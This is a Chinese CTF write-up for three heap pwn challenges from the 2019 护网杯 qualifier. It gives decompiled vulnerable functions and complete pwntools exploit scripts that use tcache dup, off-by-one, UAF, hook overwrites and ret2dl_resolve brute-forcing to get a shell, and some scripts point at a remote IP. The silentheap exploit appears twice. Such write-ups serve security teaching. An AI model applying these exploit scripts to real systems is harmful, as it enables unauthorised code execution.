---
title: 护网杯预选赛pwn部分writeup
categories:
- 护网杯2019
---
# 护网杯 pwn writeup

## mergeheap

### 漏洞利用

libc2.27，strcat连接的时候溢出改size造成overlapping，之后tcache dup改chunk的size，拿到unsorted bin泄露地址，最后tcache dup到free_hook即可。

```c
int Merge()
{
  int final_size; // ST1C_4
  signed int i; // [rsp+8h] [rbp-18h]
  int idx1; // [rsp+Ch] [rbp-14h]
  int idx2; // [rsp+10h] [rbp-10h]

  for ( i = 0; i <= 14 && qword_2020A0[i]; ++i )
    ;
  if ( i > 14 )
    return puts("full");
  printf("idx1:");
  idx1 = read_int();
  if ( idx1 < 0 || idx1 > 14 || !qword_2020A0[idx1] )
    return puts("invalid");
  printf("idx2:");
  idx2 = read_int();
  if ( idx2 < 0 || idx2 > 14 || !qword_2020A0[idx2] )
    return puts("invalid");
  final_size = dword_202060[idx1] + dword_202060[idx2];
  qword_2020A0[i] = malloc(final_size);
  strcpy((char *)qword_2020A0[i], (const char *)qword_2020A0[idx1]);
  strcat((char *)qword_2020A0[i], (const char *)qword_2020A0[idx2]);// 漏洞
  dword_202060[i] = final_size;
  return puts("Done");
}
```

### exp.py

```py
#coding=utf-8
from pwn import *
context.update(arch='amd64',os='linux',log_level='DEBUG')
context.terminal = ['tmux','split','-h']
debug = 1
elf = ELF('./mergeheap')
libc_offset = 0x3c4b20
gadgets = [0x45216,0x4526a,0xf02a4,0xf1147]
if debug:
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    p = process('./mergeheap')

else:
    libc = ELF('./libc-2.27.so')
    p = remote('49.232.101.194',54337)

def Add(size,content):
    p.recvuntil('>>')
    p.sendline('1')
    p.recvuntil("len:")
    p.sendline(str(size))
    p.recvuntil("content:")
    p.send(content)

def Show(index):
    p.recvuntil('>>')
    p.sendline('2')
    p.recvuntil('idx:')
    p.sendline(str(index))

def Delete(index):
    p.recvuntil('>>')
    p.sendline('3')
    p.recvuntil('idx:')
    p.sendline(str(index))

def Merge(idx1,idx2):
    p.recvuntil('>>')
    p.sendline('4')
    p.recvuntil('idx1:')
    p.sendline(str(idx1))
    p.recvuntil('idx2:')
    p.sendline(str(idx2))

def exp():
    #leak libc
    Add(0x20,'a'*0x20)#0
    Add(0x28,'a'*0x28)#1
    Add(0xf8,'b'*0xf8)#2
    Add(0x48,'a'*0x48)#3
    Add(0x78,'a'*0x78)#4
    Add(0x78,'a'*0x78)#5
    Add(0x78,'a'*0x78)#6
    Add(0x3f8,'a\n')#7
    Add(0x78,'a'*0x78)#8
    Delete(3)
    Merge(0,1)#3
    Delete(4)
    #
    Add(0xf8,'b'*0x70+p64(0)+p64(0x501)+'\n')# freed 5 & 6 & 7
    Delete(5)
    Add(0x78,'a\n')#5
    Show(6)
    libc_base = u64(p.recvline().strip('\n').ljust(8,'\x00')) - (0x7ffff7dcfca0 - 0x7ffff79e4000)
    log.success('libc base => ' + hex(libc_base))
    #get shell
    free_hook = libc_base + libc.symbols['__free_hook']
    Delete(7)
    Add(0xf8,'c'*0x70+p64(0)+p64(0x401)+p64(free_hook)+'\n')#7
    Add(0x3f8,'/bin/sh\x00\n')#8
    Add(0x3f8,p64(libc_base+libc.symbols['system'])+'\n')#9
    Delete(9)
    p.interactive()

exp()
```

## flower

### 漏洞利用

只能Add`0x58`及以下的chunk，Add的时候不会检查index位置是否为空可以直接覆写，input有off-by-one，但只有0x58的可以。

```c
__int64 Add()
{
  __int64 result; // rax
  int idx; // [rsp+0h] [rbp-10h]
  int size; // [rsp+4h] [rbp-Ch]
  void *chunk_addr; // [rsp+8h] [rbp-8h]

  printf("Name of Size : ");
  size = read_int();
  if ( size > 0 && size <= 0x58 )
  {
    printf("input index: ");
    idx = read_int();
    if ( idx >= 0 && idx <= 5 )
    {
      chunk_addr = malloc(size);
      if ( !chunk_addr )
      {
        puts("malloc error");
        exit(0);
      }
      dword_2020A8[4 * idx] = size;
      *((_QWORD *)&unk_2020A0 + 2 * idx) = chunk_addr;
      puts("input flower name:");
      get_input(*((_BYTE **)&unk_2020A0 + 2 * idx), size);
      result = 0LL;
    }
    else
    {
      puts("error");
      result = 0LL;
    }
  }
  else
  {
    printf("error");
    result = 0LL;
  }
  return result;
}
```

```c
__int64 __fastcall get_input(_BYTE *a1, unsigned int a2)
{
  __int64 v3; // [rsp+18h] [rbp-8h]

  if ( !a2 )
    return 0LL;
  v3 = (signed int)read(0, a1, a2);
  if ( v3 == 0x58 )
    a1[0x58] = 0;                               // off-by-one
  return v3;
}
```

这里输入choice时使用scanf，因为scanf是用malloc分配的缓冲区，在输入数据量大的时候会进行chunk的合并操作，合并之后的chunk会被放入smallbin，分配的时候会先看smallbin，不合适用top_chunk分配。

泄露libc:释放几个chunk，scanf输入大量数据最后merge得到unsorted bin，分配一个chunk用Show即可泄露Libc。

get shell：开始先用chunk shrink，改了size之后发现smallbin报的size error，之后以为这个构造有问题，于是改成了chunk extend，结果merge的时候好像不会合并或者出问题（总之是自己操作不太行）。最后还是改回chunk shrink，构造后面的fake_prev_size和fake_size，最后构造拿到Overlap chunk制造double free，地址开随机化的话heap前一个字节为0x55或0x56，0x56对应fastbin[0x50]，free一个0x28的块，在main_arena里malloc到这个块0x56打头为size的块，修改main_arena的top_chunk到malloc_hook附近的块，这里选的是0x25，malloc到这个块修改realloc_hook为one_gadget，malloc_hook为realloc+x，偏移和gadget自己调整一下，最后拿shell。

### exp.py

```py
#coding=utf-8
from pwn import *
context.update(arch='amd64',os='linux',log_level='DEBUG')
context.terminal = ['tmux','split','-h']
debug = 1
elf = ELF('./pwn')
libc_offset = 0x3c4b20
gadgets = [0x45216,0x4526a,0xf02a4,0xf1147]
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
if debug:
    p = process('./pwn')
else:
    p = remote('49.232.101.194',54337)

def Add(size,index,name):
    p.recvuntil('>>')
    p.sendline('1')
    p.recvuntil("Size : ")
    p.sendline(str(size))
    p.recvuntil('index: ')
    p.sendline(str(index))
    p.recvuntil("name:")
    p.send(name)

def Show(index):
    p.recvuntil('>>')
    p.sendline('3')
    p.recvuntil('idx :')
    p.sendline(str(index))

def Delete(index):
    p.recvuntil('>>')
    p.sendline('2')
    p.recvuntil('idx :')
    p.sendline(str(index))

def exp():

    #leak libc
    Add(0x58,0,'a')#0
    Add(0x58,1,'a')#1
    Add(0x58,2,'a')#2
    Add(0x58,3,'a')#3
    Add(0x48,4,'a')#4
    Add(0x58,5,'a')#5
    #
    Delete(2)
    Delete(3)
    Delete(4)
    p.recvuntil('>>')
    p.sendline('1'*0x800)
    #
    Add(0x50,2,'a'*8)#2
    Show(2)
    p.recvuntil(' : aaaaaaaa')
    libc_base = u64(p.recvn(6).strip('\n').ljust(8,'\x00')) - (0x00007fa9b0771c78-0x7fa9b03ad000)
    log.success('libc base => ' + hex(libc_base))


    #get shell
    #3 & 4 & 5
    Add(0x58,3,'a')#3
    Add(0x48,4,'a')#4

    Delete(3)
    Delete(4)
    Delete(5)

    Add(0x18,5,'a')#5 border
    #

    Add(0x50,5,'a')#5
    Add(0x40,4,'a')#4
    Add(0x50,3,'a'*0x30+p64(0x100)+p64(0x20))#3
    #chunk shrink
    Delete(1)
    Delete(2)
    Delete(3)
    Delete(4)

    p.recvuntil('>>')
    p.sendline('1'*0x800)#1 & 2 & 3 & 4
    Delete(0)
    Add(0x58,0,'a'*0x50+p64(0))
    #

    Add(0x58,1,'a')#1
    Add(0x48,2,'a')#2
    Add(0x48,3,'a')#3
    Delete(1)
    Delete(2)
    #Delete(3)
    p.recvuntil('>>')
    p.sendline('1'*0x800)#1 & 2 & 3 & 4
    Delete(5)

    p.recvuntil('>>')
    p.sendline('1'*0x800)#1 & 2 & 3 & 4

    #overlap chunk3
    Add(0x58,1,'a')#1
    Add(0x48,2,'a')#2
    Add(0x48,0,'a')#0 == 3
    #double free
    Add(0x48,4,'a')#4
    Add(0x28,5,'a')#5
    Delete(5)
    Delete(0)
    Delete(4)
    Delete(3)
    #
    main_arena = libc_base + (0x7fa9b0771b20-0x7fa9b03ad000)
    fake_chunk = main_arena+0xd
    fake_top = libc_base + libc.symbols['__malloc_hook']-0x25
    #fake_top = libc_base + libc.symbols['__free_hook']-0x17
    shell_addr = libc_base + gadgets[1]#0 2 tried
    system_addr = libc_base + libc.symbols['system']
    realloc_addr = libc_base + libc.symbols['realloc']
    Add(0x48,0,p64(fake_chunk))#0
    Add(0x48,4,'a')#4
    Add(0x48,0,'a')#0


    Add(0x48,3,'\x00'*0x3b+p64(fake_top))


    Add(0x58,0,'\x00'*(5+0x8)+p64(shell_addr)+p64(realloc_addr+0xe))
    #gdb.attach(p)
    #Add(0x58,0,'\x00'*7+p64(system_addr))#0

    #Add(0x38,0,'\x00'*7+p64(system_addr))#0
    p.recvuntil('>>')
    p.sendline('1')
    p.recvuntil("Size : ")
    p.sendline(str(17))
    p.recvuntil('index: ')
    p.sendline(str(0))

    #Add(0x10,1,'/bin/sh\x00')
    #Delete(1)
    p.interactive()

exp()
```

## silentheap

### 前言

这题花的时间最久，最后也不算完全搞好，看了长亭的Exp和另一个大佬的思路，留在这里记录一下。

### 程序逻辑

程序有几个功能，Malloc1分配一个0x158的块，在0x154偏移处放了magic1函数地址

```c
void Malloc1()
{
  char *chunk_addr; // ST18_4
  signed int i; // [esp+Ch] [ebp-Ch]

  for ( i = 0; i <= 9 && ptr[i]; ++i )
    ;
  if ( i <= 9 )
  {
    chunk_addr = (char *)malloc(0x158u);
    strcpy(chunk_addr + 4, src);
    *((_DWORD *)chunk_addr + 0x55) = magic1;    // offset:0x154
    ptr[i] = chunk_addr;
    dword_804AA60[i] = 1;
  }
}
```

Malloc2分配一个0x358的堆块，0x354处放magic2函数地址

```c
void Malloc2()
{
  char *v0; // ST18_4
  signed int i; // [esp+Ch] [ebp-Ch]

  for ( i = 0; i <= 9 && ptr[i]; ++i )
    ;
  if ( i <= 9 )
  {
    v0 = (char *)malloc(0x358u);
    strcpy(v0 + 4, aThouWhoArtDark);
    *((_DWORD *)v0 + 0xD5) = magic2;
    ptr[i] = v0;
    dword_804AA60[i] = 2;
  }
}

int __cdecl magic1(int chunk_addr)
{
  int result; // eax
  char s1; // [esp+0h] [ebp-158h]

  get_input((int)&s1, 0x150);
  result = strcmp(&s1, (const char *)(chunk_addr + 4));
  if ( !result )
    result = get_input(chunk_addr + 4, 0x150);
  return result;
}

int __cdecl magic2(int chunk_addr)
{
  int result; // eax
  char s1; // [esp+0h] [ebp-358h]

  get_input((int)&s1, 0x350);
  result = strcmp(&s1, (const char *)(chunk_addr + 4));
  if ( !result )
    result = get_input(chunk_addr + 4, 0x350);
  return result;
}

```

Free函数从后往前覆盖，不会清空chunk_addr[idx]，但是会把chunk_size[idx]清零。

```c
int Free()
{
  int result; // eax
  int idx; // [esp+8h] [ebp-10h]
  signed int i; // [esp+Ch] [ebp-Ch]

  result = read_int();
  idx = result;
  if ( result >= 0 && result <= 9 )
  {
    result = (int)ptr[result];
    if ( result )
    {
      result = dword_804AA60[idx];
      if ( result )
      {
        free(ptr[idx]);
        for ( i = idx; i <= 8 && ptr[i]; ++i )
        {
          ptr[i] = ptr[i + 1];
          dword_804AA60[i] = dword_804AA60[i + 1];
        }
        result = i;
        dword_804AA60[i] = 0;
      }
    }
  }
  return result;
}
```

CallFunc可以去调用堆里的magic函数，这里有UAF，UAF一个0x358的块，提前在里面构造好magic2的函数地址，之后可以任意地址执行。长亭的wp是ret到了0x08048690，调试之后发现ret过去相当于getinput栈地址，size为0x08..的一个极大数，这就造成了栈溢出，因为这里没有puts函数，栈迁移之后构造ret2_dl_runtime_resolve应该就可以了，但是调试发现不太行，这块有点迷，也懒得编译32位libc去看源码了，再看另一个师傅1mpossible的wp发现可以爆破，bss里放个binsh，之后爆破execv的地址，大概中间三字节是0xdxx或者0xexx，因此复杂度应该是256*2，本地跑了三分钟出的，个人感觉远程应该要10分钟以上。


```exp.py
from pwn import *

context.log_level="DEBUG"
#s = remote('152.136.21.148',12047)
context.terminal = ['tmux','split','-h']
elf = ELF('./silentheap')
gadgets = [0x3d0d3,0x3d0d5,0x3d0d9,0x3d0e0,0x67a7f,0x67a80,0x137e5e,0x137e5f]
def malloc_0(s):
    s.sendline('1')
def malloc_1(s):
    s.sendline('2')
def run(s,idx):
    s.sendline('3')
    s.sendline(str(idx))
def free(s,idx):
    s.sendline('4')
    s.sendline(str(idx))
def write_(s,idx):
    s.sendline('5')
    s.sendline(str(idx))
def pwn(s):
    p_ret = 0x0804841d
    p2_ret = 0x08048aca
    p3_ret = 0x08048ac9
    p4_ret = 0x08048ac8
    a1 = "Darkness beyond twilight Crimson beyond blood that flows Buried in the stream of time is where your power grows I pledge myself to conquer all the foes who stand before the mighty gift bestowed in my unworthy hand Let the fools who stand before me be destroyed by the power you and I possess..."
    a2 = "Thou who art darker than even darkness, Thou who art deeper than even the night! Thou, the Sea of Chaos, who drifts upon it, Golden Lord of Darkness! Hereby I call to thee, Hereby I swear before thee! Those who would stand against us, All those who are fools, By the power you and I possess, Grant destruction equally upon them all!"

    dynamic= 0x08049f14
    strtab = 0x080482cc
    symtab = 0x080481dc
    rel_plt = 0x080483b4
    write_(s,1)
    #s.sendline(a1)
    s.sendline('A'*0x148)
    write_(s,2)
    #s.sendline(a2)
    s.sendline(p32(0x08048690)*(0x348/4))
    for i in range(10):
        malloc_1(s)
    free(s,9)
    #gdb.attach(s,'b* 0x080489ba')

    #gdb.attach(s,'b* 0x080489ba')

    #gdb.attach(s,'b* 0x08048694')
    #gdb.attach(s,'b* 0x80486ac')
    run(s,9)
    bss_1 = elf.bss()+0x100
    log.success('bss1 addr => ' + hex(bss_1))
    bss_2 = elf.bss()+0x200
    read_plt = elf.plt['read']
    resolve_plt = 0x08048420
    leave_ret = 0x08048538
    pay = 'A'*0x12
    pay += p32(bss_1)
    pay += p32(read_plt) + p32(0x08048ac8) + p32(0) + p32(bss_1) + p32(0x100) + p32(bss_1) + p32(leave_ret)
    s.sendline(pay)
    #calc
    free_got = elf.got['free']
    fake_data_addr = bss_1 + 0x40
    fake_rel_off = fake_data_addr - rel_plt
    fake_sym_off = (fake_data_addr + 0x10 - symtab) / 0x10
    log.info('fake sym off => ' + hex(fake_sym_off))
    fake_str_off = (fake_data_addr+0xc+0x10-strtab)
    binsh_addr = (fake_data_addr+0xc+0x10+0x7)
    #set structs
    fake_rel = p32(free_got) + p32((fake_sym_off<<8)+7)
    fake_sym = p32(fake_str_off)+p32(0)*2+chr(0x12)+chr(0)+p16(0)
    strings = "system\x00/bin/sh\x00\x00"
    #
    payload = p32(0) + p32(resolve_plt) + p32(fake_rel_off)+"a"*4+p32(binsh_addr)
    payload = payload.ljust(0x3c,'a')
    payload += p32(binsh_addr)
    payload += fake_rel + 'a'*4 + fake_sym + strings
    binsh_addr = 0x0804ab20+0x8
    buf = p32(bss_1)+p32(p3_ret)+"/bin/sh\x00"+p32(bss_1)+p32(0xf7dea000+0xbf740)+p32(0x08048406)+p32(binsh_addr)+p32(0)*2
    s.send(buf)
    s.sendline("ls")
    data = s.recv()
    if data and "smashing" not in data:
        s.interactive()
if __name__ == "__main__":
    while True:
        s = process('./silentheap')
        try:
            pwn(s)
        except Exception as e:
            s.close()
        finally:
            s.close()
```


```c
int CallFunc()
{
  int result; // eax
  int v1; // [esp+Ch] [ebp-Ch]

  result = read_int();
  v1 = result;
  if ( result >= 0 && result <= 9 )
  {
    result = (int)ptr[result];
    if ( result )
    {
      if ( dword_804AA60[v1] == 2 )
        result = (*((int (__cdecl **)(void *))ptr[v1] + 0xD5))(ptr[v1]);
      else
        result = (*((int (__cdecl **)(void *))ptr[v1] + 0x55))(ptr[v1]);// else 包含0的情况
    }
  }
  return result;
}
```
```asm
.text:08048690                 lea     eax, [ebp+nptr]
.text:08048693                 push    eax
.text:08048694                 call    get_input
.text:08048699                 add     esp, 10h
.text:0804869C                 sub     esp, 0Ch
.text:0804869F                 lea     eax, [ebp+nptr]
.text:080486A2                 push    eax             ; nptr
.text:080486A3                 call    _atoi
.text:080486A8                 add     esp, 10h
.text:080486AB                 leave
.text:080486AC                 retn
```

### exp.py

```py
from pwn import *

context.log_level="DEBUG"
#s = remote('152.136.21.148',12047)
context.terminal = ['tmux','split','-h']
elf = ELF('./silentheap')
gadgets = [0x3d0d3,0x3d0d5,0x3d0d9,0x3d0e0,0x67a7f,0x67a80,0x137e5e,0x137e5f]
def malloc_0(s):
    s.sendline('1')
def malloc_1(s):
    s.sendline('2')
def run(s,idx):
    s.sendline('3')
    s.sendline(str(idx))
def free(s,idx):
    s.sendline('4')
    s.sendline(str(idx))
def write_(s,idx):
    s.sendline('5')
    s.sendline(str(idx))
def pwn(s):
    p_ret = 0x0804841d
    p2_ret = 0x08048aca
    p3_ret = 0x08048ac9
    p4_ret = 0x08048ac8
    a1 = "Darkness beyond twilight Crimson beyond blood that flows Buried in the stream of time is where your power grows I pledge myself to conquer all the foes who stand before the mighty gift bestowed in my unworthy hand Let the fools who stand before me be destroyed by the power you and I possess..."
    a2 = "Thou who art darker than even darkness, Thou who art deeper than even the night! Thou, the Sea of Chaos, who drifts upon it, Golden Lord of Darkness! Hereby I call to thee, Hereby I swear before thee! Those who would stand against us, All those who are fools, By the power you and I possess, Grant destruction equally upon them all!"

    dynamic= 0x08049f14
    strtab = 0x080482cc
    symtab = 0x080481dc
    rel_plt = 0x080483b4
    write_(s,1)
    #s.sendline(a1)
    s.sendline('A'*0x148)
    write_(s,2)
    #s.sendline(a2)
    s.sendline(p32(0x08048690)*(0x348/4))
    for i in range(10):
        malloc_1(s)
    free(s,9)
    #gdb.attach(s,'b* 0x080489ba')

    #gdb.attach(s,'b* 0x080489ba')

    #gdb.attach(s,'b* 0x08048694')
    #gdb.attach(s,'b* 0x80486ac')
    run(s,9)
    bss_1 = elf.bss()+0x100
    log.success('bss1 addr => ' + hex(bss_1))
    bss_2 = elf.bss()+0x200
    read_plt = elf.plt['read']
    resolve_plt = 0x08048420
    leave_ret = 0x08048538
    pay = 'A'*0x12
    pay += p32(bss_1)
    pay += p32(read_plt) + p32(0x08048ac8) + p32(0) + p32(bss_1) + p32(0x100) + p32(bss_1) + p32(leave_ret)
    s.sendline(pay)
    #calc
    free_got = elf.got['free']
    fake_data_addr = bss_1 + 0x40
    fake_rel_off = fake_data_addr - rel_plt
    fake_sym_off = (fake_data_addr + 0x10 - symtab) / 0x10
    log.info('fake sym off => ' + hex(fake_sym_off))
    fake_str_off = (fake_data_addr+0xc+0x10-strtab)
    binsh_addr = (fake_data_addr+0xc+0x10+0x7)
    #set structs
    fake_rel = p32(free_got) + p32((fake_sym_off<<8)+7)
    fake_sym = p32(fake_str_off)+p32(0)*2+chr(0x12)+chr(0)+p16(0)
    strings = "system\x00/bin/sh\x00\x00"
    #
    payload = p32(0) + p32(resolve_plt) + p32(fake_rel_off)+"a"*4+p32(binsh_addr)
    payload = payload.ljust(0x3c,'a')
    payload += p32(binsh_addr)
    payload += fake_rel + 'a'*4 + fake_sym + strings
    binsh_addr = 0x0804ab20+0x8
    buf = p32(bss_1)+p32(p3_ret)+"/bin/sh\x00"+p32(bss_1)+p32(0xf7dea000+0xbf740)+p32(0x08048406)+p32(binsh_addr)+p32(0)*2
    s.send(buf)
    s.sendline("ls")
    data = s.recv()
    if data and "smashing" not in data:
        s.interactive()
if __name__ == "__main__":
    while True:
        s = process('./silentheap')
        try:
            pwn(s)
        except Exception as e:
            s.close()
        finally:
            s.close()
```